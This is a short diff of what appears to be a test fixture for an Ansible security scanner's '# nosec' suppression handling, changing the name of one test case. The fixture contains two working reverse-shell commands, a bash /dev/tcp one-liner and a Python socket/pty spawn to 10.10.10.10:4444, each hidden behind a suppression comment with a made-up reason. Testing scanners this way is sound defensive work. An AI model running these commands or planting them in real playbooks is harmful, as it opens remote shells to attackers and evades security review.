@@ -1788,7 +1788,7 @@
     - name: malicious suppression - reverse-shell content behind a fake reason
       ansible.builtin.shell: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # nosec: bash_dev_tcp_reverse_shell reason="penetration test fixture"
 
-    - name: suppression targets an unsuppressable rule (rejected)
+    - name: suppression on reverse-shell content (valid, but raises suspicious_suppression)
       ansible.builtin.shell: "python3 -c 'import socket,os,pty; s=socket.socket(); s.connect((\"10.10.10.10\",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn(\"/bin/sh\")'"  # nosec: python_reverse_shell reason="nope"
 
 # -- ansible.cfg hardening ----------------------------------------------
